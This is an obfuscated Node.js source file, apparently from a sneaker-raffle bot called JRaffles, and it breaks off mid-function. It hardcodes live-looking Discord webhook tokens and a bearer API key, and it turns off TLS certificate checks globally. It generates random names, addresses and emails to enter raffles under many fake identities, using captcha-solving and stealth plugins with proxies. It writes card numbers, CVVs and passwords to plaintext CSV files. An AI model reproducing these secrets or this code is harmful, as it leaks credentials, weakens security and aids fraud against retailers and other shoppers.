process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x51338a = require('fs'), _0x3f5bdd = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x4b7505(_0x5a16a7) {
    const _0x333670 = _0x51338a['createWriteStream'](_0x5a16a7, { 'flags': 'a' }), _0x3e82c5 = console['log'];
    console['log'] = function () {
        const _0x5164c1 = Array['prototype']['slice']['call'](arguments), _0x3b09cc = _0x5164c1['join']('\x20') + '\x0a';
        _0x333670['write'](_0x3b09cc), _0x3e82c5['apply'](console, _0x5164c1);
    };
}
_0x4b7505('../logs/log\x20' + _0x3f5bdd);
var _0x4597e7 = require('tough-cookie'), _0x3b7ac6 = require('node-imap'), _0x3f6722 = require('util')['inspect'];
const _0x4bee6e = require('mailparser')['simpleParser'], { EmbedBuilder: _0x169224 } = require('discord.js');
var _0x56c2d9 = require('exe');
const { execFile: _0x1fe29f } = require('child_process'), _0x2e0e40 = require('puppeteer-extra'), _0x57bfd9 = require('puppeteer-extra-plugin-recaptcha'), _0x5a52fd = require('puppeteer-extra-plugin-stealth'), _0x54c1f9 = require('chalk'), _0x48898b = require('node-bash-title'), _0x51d926 = require('axios'), _0x2300d9 = require('papaparse');
var _0xfe7fd5 = require('random-name');
const _0x59e135 = require('request');
var _0x3f22ee = require('prompt');
const _0x15a445 = _0x59e135['jar']();
var _0x2c28ef = {};
const _0xf94f = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x2b6839 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x19a9a2 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x2501be = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x4464e4 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x136f7e = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x4ceb12 = 'https://discord.com/api/webhooks/', _0x537e74 = '' + _0x4ceb12 + _0x19a9a2, _0x28952d = '' + _0x4ceb12 + _0x2501be, _0x77ca8c = '' + _0x4ceb12 + _0xf94f, _0x408671 = '' + _0x4ceb12 + _0x2b6839, _0x578906 = '' + _0x4ceb12 + _0x4464e4, _0x2dfb22 = '' + _0x4ceb12 + _0x136f7e;
const _0x5ae868 = JSON['parse'](_0x51338a['readFileSync']('../package.json', 'utf-8')), _0x9f51f3 = _0x5ae868['version'];
var _0x5df038, _0x885851, _0x3ffcd7, _0x580c0e, _0x5c9ace, _0x4ca687, _0x50fbd1, _0x19eddd;
const _0x400bcd = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x38611d = ![];
const _0x412acd = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x2ca489 = '0123456789';
var _0x3942a0 = _0x412acd['split']('');
const _0x42bff1 = require('auto-git-update'), _0x1703d9 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x2bbf14 = new _0x42bff1(_0x1703d9);
async function _0x536afd() {
    _0x5c9ace = _0x51338a['readdirSync']('../proxies'), _0x580c0e = _0x51338a['readdirSync']('../tasks'), !_0x51338a['existsSync']('../accounts/fenom.csv') && _0x51338a['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x51338a['existsSync']('../accounts/paypal.csv') && _0x51338a['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x51338a['existsSync']('../accounts/bstn.csv') && _0x51338a['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x51338a['existsSync']('../accounts/eql.csv') && _0x51338a['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x51338a['existsSync']('../failed-tasks.csv') && _0x51338a['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x51338a['existsSync']('../successful-tasks.csv') && _0x51338a['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x2c28ef = JSON['parse'](_0x51338a['readFileSync']('../settings.json', 'utf-8')), !_0x2c28ef['delay'] && (_0x2c28ef['delay'] = 0x3c, _0x51338a['writeFileSync']('../settings.json', JSON['stringify'](_0x2c28ef, null, 0x2))), !_0x2c28ef['masterMail'] && (_0x2c28ef['masterMail'] = 'yourmail@gmail.com', _0x51338a['writeFileSync']('../settings.json', JSON['stringify'](_0x2c28ef, null, 0x2))), !_0x2c28ef['masterPassword'] && (_0x2c28ef['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x51338a['writeFileSync']('../settings.json', JSON['stringify'](_0x2c28ef, null, 0x2))), !_0x2c28ef['captchaKey'] && (_0x2c28ef['captchaKey'] = '', _0x51338a['writeFileSync']('../settings.json', JSON['stringify'](_0x2c28ef, null, 0x2))), !_0x2c28ef['useRandomProxy'] && (_0x2c28ef['useRandomProxy'] = !![], _0x51338a['writeFileSync']('../settings.json', JSON['stringify'](_0x2c28ef, null, 0x2))), !_0x2c28ef['shuffleTasks'] && (_0x2c28ef['shuffleTasks'] = ![], _0x51338a['writeFileSync']('../settings.json', JSON['stringify'](_0x2c28ef, null, 0x2))), !_0x2c28ef['webhook'] && (_0x2c28ef['webhook'] = '', _0x51338a['writeFileSync']('../settings.json', JSON['stringify'](_0x2c28ef, null, 0x2))), _0x2c28ef['delay'] <= 0x1388 && (_0x2c28ef['delay'] = _0x2c28ef['delay'] * 0x3e8), _0x2c28ef['AfewDelay'] && (delete _0x2c28ef['AfewDelay'], _0x51338a['writeFileSync']('../settings.json', JSON['stringify'](_0x2c28ef, null, 0x2))), _0x2c28ef['MahaDelay'] && (delete _0x2c28ef['MahaDelay'], _0x51338a['writeFileSync']('../settings.json', JSON['stringify'](_0x2c28ef, null, 0x2))), _0x2c28ef['footshopDelay'] && (delete _0x2c28ef['footshopDelay'], _0x51338a['writeFileSync']('../settings.json', JSON['stringify'](_0x2c28ef, null, 0x2))), _0x2c28ef['MahaDelay'] = _0x2c28ef['delay'], _0x4ceb12 = _0x2c28ef['webhook'], _0x4ca687 = _0x2c28ef['licenseKey'];
}
let _0xe282db, _0x4fd297 = [], _0x1aaac1;
const _0x468cfd = _0x1ea3c7 => new Promise(_0x44bef1 => setTimeout(_0x44bef1, _0x1ea3c7));
function _0x120a07(_0x241ea5, _0x9d093f) {
    return Math['floor'](Math['random']() * (_0x9d093f - _0x241ea5 + 0x1) + _0x241ea5);
}
function _0x1096a9(_0x281861) {
    let _0x1b822c = _0x281861['length'], _0x404367;
    while (_0x1b822c != 0x0) {
        _0x404367 = Math['floor'](Math['random']() * _0x1b822c), _0x1b822c--, [_0x281861[_0x1b822c], _0x281861[_0x404367]] = [
            _0x281861[_0x404367],
            _0x281861[_0x1b822c]
        ];
    }
    return _0x281861;
}
async function _0x57b30a(_0x562382) {
    return _0x51d926['get']('https://api.hyper.co/v4/licenses/' + _0x562382, { 'headers': { 'Authorization': 'Bearer\x20' + _0x400bcd } })['then'](_0x1b8dd0 => _0x1b8dd0['data'])['catch'](() => null);
}
;
async function _0x5bb6fb(_0xe73af2) {
    console['clear']();
    if (_0xe73af2 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x1f79fa = await _0x3f22ee['get']('License');
        if (_0x1f79fa['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x468cfd(0xbb8), _0x5bb6fb(_0xe73af2);
        _0xe73af2 = _0x1f79fa['License'], _0x2c28ef['licenseKey'] = _0xe73af2, _0x4ca687 = _0xe73af2, _0x51338a['writeFileSync']('../settings.json', JSON['stringify'](_0x2c28ef));
    }
    console['log']('Checking\x20license\x20' + _0x4ca687 + '...'), await _0x468cfd(0x320);
    const _0x3c08d9 = await _0x57b30a(_0xe73af2);
    _0x50fbd1 = JSON['stringify'](_0x3c08d9['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x19eddd = JSON['stringify'](_0x3c08d9['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x3c08d9)
        return console['log']('License\x20not\x20found');
    if (!_0x3c08d9['user'])
        return console['log']('License\x20not\x20bound');
    return _0x3c08d9['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x38611d = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x38611d = ![]);
}
async function _0x509a22() {
    var _0x319c03 = await _0x3f22ee['get']('Module');
    return console['clear'](), _0x319c03['Module'];
}
;
async function _0x5cbbd7() {
    var _0x490a11 = await _0x3f22ee['get']('Setting');
    return console['clear'](), _0x490a11['Setting'];
}
async function _0x1dbf5e(_0x6edb0) {
    var _0x5a3431 = [];
    for (file of _0x580c0e) {
        var _0x576f16 = _0x51338a['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x2300d9['parse'](_0x576f16, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x6edb0['store'] && _0x5a3431['push'](file);
    }
    !_0x5a3431['length'] == 0x0 && (_0x580c0e = _0x5a3431);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x115055 = 0x0; _0x115055 < _0x580c0e['length']; _0x115055++) {
        console['log']('\x20(' + _0x115055 + ')\x20' + _0x580c0e[_0x115055]);
    }
    console['log']('');
    var _0x4d038f = await _0x3f22ee['get']('Task');
    if (_0x4d038f['Task'] > _0x580c0e['length'] - 0x1 || isNaN(_0x4d038f['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x468cfd(0x3e8), _0x1dbf5e();
    var _0x27d32c = _0x51338a['readFileSync']('../tasks/' + _0x580c0e[_0x4d038f['Task']], 'utf-8');
    return _0x3ffcd7 = _0x2300d9['parse'](_0x27d32c, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x54c1f9['blue'](_0x580c0e[_0x4d038f['Task']])), _0x5df038 = _0x580c0e[_0x4d038f['Task']], _0x3ffcd7;
}
async function _0x2ce8a0() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0xd75f59 = 0x0; _0xd75f59 < _0x5c9ace['length']; _0xd75f59++) {
        console['log']('\x20(' + _0xd75f59 + ')\x20' + _0x5c9ace[_0xd75f59]);
    }
    console['log']('');
    var _0x55bee1 = await _0x3f22ee['get']('Proxies');
    if (_0x55bee1['Proxies'] > _0x5c9ace['length'] - 0x1 || isNaN(_0x55bee1['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x468cfd(0x3e8), _0x2ce8a0();
    var _0x3eb558 = _0x51338a['readFileSync']('../proxies/' + _0x5c9ace[_0x55bee1['Proxies']], 'utf-8')['split']('\x0a');
    let _0x52e29d = _0x3eb558['map']((_0x3c19ef, _0x5ea816) => {
        sanatizeProxy = _0x3c19ef['replace']('\x0d', '');
        if (_0x3eb558[_0x5ea816 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x885851 = _0x5c9ace[_0x55bee1['Proxies']], console['clear'](), _0x52e29d;
}
async function _0x27d151() {
    var _0xb99896 = await _0x3f22ee['get']('Value');
    return console['clear'](), _0xb99896['Value'];
}
async function _0x3c6619(_0x67e068) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x10a223 = 0x0; _0x10a223 < _0x67e068['length']; _0x10a223++) {
        console['log']('\x20(' + _0x10a223 + ')\x20[' + _0x67e068[_0x10a223]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x17aca5 = await _0x3f22ee['get']('Module');
    return _0x17aca5['Module'];
}
async function _0x5d4753() {
    var _0x1c4afe = await _0x3f22ee['get']('Password');
    return console['clear'](), _0x1c4afe['Password'];
}
;
async function _0x4039c6() {
    var _0x5c4370 = await _0x3f22ee['get']('Links');
    return _0x5c4370['Links'];
}
;
async function _0x506c2c() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x5a50d8 = 0x0; _0x5a50d8 < _0x4fd297['length']; _0x5a50d8++) {
        console['log']('\x20(' + _0x5a50d8 + ')\x20' + _0x4fd297[_0x5a50d8]);
    }
    ;
    console['log']();
    let _0xae0b6 = await _0x3f22ee['get']('Product');
    return console['clear'](), _0xae0b6['Product'];
}
;
function _0x2e90f3() {
    var _0x448ca0 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x448ca0;
}
;
function _0x412ea8() {
    var _0x12c2ba = new Date(Date['now']())['toLocaleString']();
    return _0x12c2ba['replace'](',', '');
}
async function _0x4feadc(_0x1eff6f, _0x54f13f) {
    let _0x2eb1fb = { 'headers': { 'content-type': 'application/json' } };
    if (_0x9f51f3 != 'devkey') {
        await _0x51d926['post'](_0x1eff6f, _0x54f13f, _0x2eb1fb);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x436de5(_0x4a615e, _0x2c91ee, _0x3ab87c, _0x11538e, _0x1f8486) {
    if (!_0x11538e && _0x3ab87c == 'dev') {
        var _0x411b5b = new _0x169224()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x2c91ee['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x2c91ee['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x4a615e['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x2c28ef['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x50fbd1,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x4a615e['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x4a615e['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x9f51f3,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x411b5b['data'];
    } else {
        if (_0x11538e && _0x3ab87c == 'dev') {
            var _0x411b5b = new _0x169224()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x2c91ee['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x50fbd1,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x2c91ee['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x4a615e['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x2c28ef['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x1f8486,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x4a615e['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x4a615e['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x9f51f3,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x411b5b['data'];
        } else {
            if (_0x3ab87c == 'pub') {
                var _0x411b5b = new _0x169224()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x2c91ee['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x2c91ee['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x4a615e['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x2c28ef['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x4a615e['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x9f51f3,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x411b5b['data'];
            } else {
                if (_0x3ab87c == 'acc' && !_0x11538e) {
                    var _0x411b5b = new _0x169224()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x2c91ee['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x50fbd1,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x2c91ee['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x2c28ef['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x9f51f3,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x411b5b['data'];
                } else {
                    if (_0x3ab87c == 'acc' && _0x11538e) {
                        var _0x411b5b = new _0x169224()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x2c91ee['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x50fbd1,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x1f8486,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x2c91ee['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x2c28ef['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x9f51f3,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x411b5b['data'];
                    } else {
                        if (_0x3ab87c == 'open') {
                            var _0x411b5b = new _0x169224()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x19eddd)['addFields']({
                                'name': 'User',
                                'value': '' + _0x50fbd1,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x9f51f3,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x411b5b['data'];
                        } else {
                            if (!_0x11538e && _0x3ab87c == 'ver') {
                                var _0x411b5b = new _0x169224()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x2c91ee['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x50fbd1,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x2c91ee['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x2c28ef['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x9f51f3,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x411b5b['data'];
                            } else {
                                if (_0x11538e && _0x3ab87c == 'ver') {
                                    var _0x411b5b = new _0x169224()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x2c91ee['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x50fbd1,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x1f8486,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x2c91ee['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x2c28ef['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x9f51f3,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x411b5b['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x16822f(_0x2d9b93, _0x2aa102) {
    var _0x36c4b2 = _0x2d9b93[_0x2aa102]['Address1']['split'](''), _0x8afcda = _0x2d9b93[_0x2aa102]['Address2']['split'](''), _0x70d755 = _0x2d9b93[_0x2aa102]['Email']['split']('@');
    for (var _0x1e12b2 = 0x0; _0x1e12b2 < _0x36c4b2['length']; _0x1e12b2++) {
        if (_0x36c4b2[_0x1e12b2] == 'X') {
            var _0x3fb6fc = Math['round'](Math['random']() * (_0x412acd['length'] - 0x1));
            _0x36c4b2[_0x1e12b2] = _0x3942a0[_0x3fb6fc];
        }
    }
    ;
    for (var _0x1e12b2 = 0x0; _0x1e12b2 < _0x8afcda['length']; _0x1e12b2++) {
        if (_0x8afcda[_0x1e12b2] == 'X') {
            var _0x3fb6fc = Math['round'](Math['random']() * (_0x412acd['length'] - 0x1));
            _0x8afcda[_0x1e12b2] = _0x3942a0[_0x3fb6fc];
        }
    }
    ;
    _0x2d9b93[_0x2aa102]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x2d9b93[_0x2aa102]['FirstName'] = _0xfe7fd5['first']());
    _0x2d9b93[_0x2aa102]['LastName']['toUpperCase']() == 'RANDOM' && (_0x2d9b93[_0x2aa102]['LastName'] = _0xfe7fd5['last']());
    _0x70d755[0x0]['toUpperCase']() == 'RANDOM' ? _0x70d755[0x0] = '' + _0xfe7fd5['first']() + _0xfe7fd5['last']() + _0x120a07(0x1, 0x270f) + '@' : _0x70d755[0x0] = _0x70d755[0x0] + '@';
    _0x2d9b93[_0x2aa102]['Email'] = _0x70d755['join'](''), _0x2d9b93[_0x2aa102]['Address1'] = _0x36c4b2['join'](''), _0x2d9b93[_0x2aa102]['Address2'] = _0x8afcda['join']('');
    _0x2d9b93[_0x2aa102]['Phone'] == 'RANDOM' && (_0x2d9b93[_0x2aa102]['Phone'] = '0' + _0x120a07(0x5f5e100, 0x3b9ac9ff));
    if (_0x2d9b93[_0x2aa102]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x28a94a = _0x120a07(0x1, 0x270f);
        _0x2d9b93[_0x2aa102]['Follower'] = '' + _0xfe7fd5['first']() + _0xfe7fd5['last']() + _0x28a94a + '\x20';
    }
    _0x2d9b93[_0x2aa102]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x2d9b93[_0x2aa102]['HouseNumber'] = _0x120a07(0x1, 0xc8));
    if (_0x2d9b93[_0x2aa102]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x204ad7 = Math['round'](Math['random']() * (_0x412acd['length'] - 0x1)), _0x9c8dcd = _0x3942a0[_0x204ad7];
        _0x2d9b93[_0x2aa102]['Address1'] = _0xfe7fd5['last']() + 'straat', _0x2d9b93[_0x2aa102]['Zip'] == '' && (_0x2d9b93[_0x2aa102]['Postcode'] = _0x120a07(0x3e8, 0x270f) + '\x20' + _0x9c8dcd + _0x9c8dcd, _0x2d9b93[_0x2aa102]['Zip'] = _0x2d9b93[_0x2aa102]['Postcode']), _0x2d9b93[_0x2aa102]['HouseNumber'] = '' + _0x120a07(0x1, 0xc8);
    }
    return;
}
;
async function _0x5cd42d(_0x2ca9bb, _0x44bb63) {
    _0x51338a['appendFileSync']('../failed-tasks.csv', _0x412ea8() + ',' + _0x44bb63['store'] + ',' + _0x44bb63['name'] + ',' + _0x2ca9bb['Url'] + ',' + _0x2ca9bb['Size'] + ',' + _0x2ca9bb['Follower'] + ',' + _0x2ca9bb['FirstName'] + ',' + _0x2ca9bb['LastName'] + ',' + _0x2ca9bb['Address1'] + ',' + _0x2ca9bb['Address2'] + ',' + _0x2ca9bb['HouseNumber'] + ',' + _0x2ca9bb['Zip'] + ',' + _0x2ca9bb['City'] + ',' + _0x2ca9bb['State'] + ',' + _0x2ca9bb['Country'] + ',' + _0x2ca9bb['Phone'] + ',' + _0x2ca9bb['Email'] + ',' + _0x2ca9bb['Password'] + ',' + _0x2ca9bb['PaymentMethod'] + ',' + _0x2ca9bb['CardType'] + ',' + _0x2ca9bb['NameOnCard'] + ',' + _0x2ca9bb['CardNumber'] + ',' + _0x2ca9bb['ExpiryDate'] + ',' + _0x2ca9bb['CVV'] + ',' + _0x2ca9bb['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x504d25(_0x4bf662, _0x46aed9) {
    _0x51338a['appendFileSync']('../successful-tasks.csv', _0x412ea8() + ',' + _0x46aed9['store'] + ',' + _0x46aed9['name'] + ',' + _0x4bf662['Url'] + ',' + _0x4bf662['Size'] + ',' + _0x4bf662['Follower'] + ',' + _0x4bf662['FirstName'] + ',' + _0x4bf662['LastName'] + ',' + _0x4bf662['Address1'] + ',' + _0x4bf662['Address2'] + ',' + _0x4bf662['HouseNumber'] + ',' + _0x4bf662['Zip'] + ',' + _0x4bf662['City'] + ',' + _0x4bf662['State'] + ',' + _0x4bf662['Country'] + ',' + _0x4bf662['Phone'] + ',' + _0x4bf662['Email'] + ',' + _0x4bf662['Password'] + ',' + _0x4bf662['PaymentMethod'] + ',' + _0x4bf662['CardType'] + ',' + _0x4bf662['NameOnCard'] + ',' + _0x4bf662['CardNumber'] + ',' + _0x4bf662['ExpiryDate'] + ',' + _0x4bf662['CVV'] + ',' + _0x4bf662['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x506e7a() {
    let _0x45b00f = proxyFile['split']('\x0a'), _0x3c3488 = _0x45b00f['map']((_0x414ac0, _0x9b18cd) => {
        sanatizeProxy = _0x414ac0['replace']('\x0d', '');
        if (_0x45b00f[_0x9b18cd + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x3c3488;
}
;
async function _0x320007(_0x7ca6c6, _0x54a2d7) {
    if (_0x29a24f != 'yes')
        var _0x29a24f = '', _0x5c7e13 = 0x0;
    async function _0x3e4bf1() {
        var _0x2e332b = _0x51338a['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x23064c = _0x2300d9['parse'](_0x2e332b, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x311d23 = 0x0; _0x311d23 < _0x23064c['length']; _0x311d23++) {
            console['log']('(' + _0x311d23 + ')\x20' + _0x23064c[_0x311d23]['Email']);
        }
        console['log']('\x0a(' + _0x23064c['length'] + ')\x20' + _0x54c1f9['cyan']('Add\x20a\x20new\x20account'));
        let _0x3e0fe7 = await _0x3f22ee['get']('Option');
        if (_0x3e0fe7['Option'] < _0x23064c['length'])
            return _0x23064c[_0x3e0fe7['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
